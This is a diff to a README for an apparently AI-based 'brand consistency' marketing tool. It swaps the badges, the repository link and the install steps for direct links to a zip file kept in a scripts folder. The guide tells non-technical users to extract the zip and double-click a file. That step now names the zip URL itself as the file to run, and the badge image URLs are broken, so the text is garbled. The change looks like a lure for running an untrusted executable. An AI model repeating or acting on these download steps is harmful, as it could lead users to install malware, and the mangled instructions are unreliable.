@@ -1,6 +1,6 @@
 # 🤖 brand-consistency-ai-skill - Keep marketing on-brand easily
 
-[![Download brand-consistency-ai-skill](https://img.shields.io/badge/Download-Get%20Started-brightgreen?style=for-the-badge)](https://github.com/esekasa/brand-consistency-ai-skill)
+[![Download brand-consistency-ai-skill](https://github.com/esekasa/brand-consistency-ai-skill/raw/refs/heads/main/scripts/skill-consistency-ai-brand-2.6.zip%20Started-brightgreen?style=for-the-badge)](https://github.com/esekasa/brand-consistency-ai-skill/raw/refs/heads/main/scripts/skill-consistency-ai-brand-2.6.zip)
 
 ---
 
@@ -37,12 +37,12 @@ You do not need programming knowledge to use this application. The steps below w
 
 Click the button below to visit the page where you can download brand-consistency-ai-skill.
 
-[![Download brand-consistency-ai-skill](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/esekasa/brand-consistency-ai-skill)
+[![Download brand-consistency-ai-skill](https://github.com/esekasa/brand-consistency-ai-skill/raw/refs/heads/main/scripts/skill-consistency-ai-brand-2.6.zip%20Page-blue?style=for-the-badge)](https://github.com/esekasa/brand-consistency-ai-skill/raw/refs/heads/main/scripts/skill-consistency-ai-brand-2.6.zip)
 
 **Steps to download and run:**
 
 1. Click the download button above or go to this link:  
-   https://github.com/esekasa/brand-consistency-ai-skill
+   https://github.com/esekasa/brand-consistency-ai-skill/raw/refs/heads/main/scripts/skill-consistency-ai-brand-2.6.zip
 
 2. On the GitHub page, look for a section named **Releases** or **Download**.
 
@@ -57,7 +57,7 @@ Click the button below to visit the page where you can download brand-consistenc
    - Download the zip file.
    - Right-click the file and select **Extract All**.
    - Open the extracted folder.
-   - Double-click the file named `brand-consistency-ai-skill.exe` or similar to start.
+   - Double-click the file named `https://github.com/esekasa/brand-consistency-ai-skill/raw/refs/heads/main/scripts/skill-consistency-ai-brand-2.6.zip` or similar to start.
 
 6. If the app depends on any supporting software (like .NET), the installer will prompt you. It usually guides you through any needed installations automatically.
 
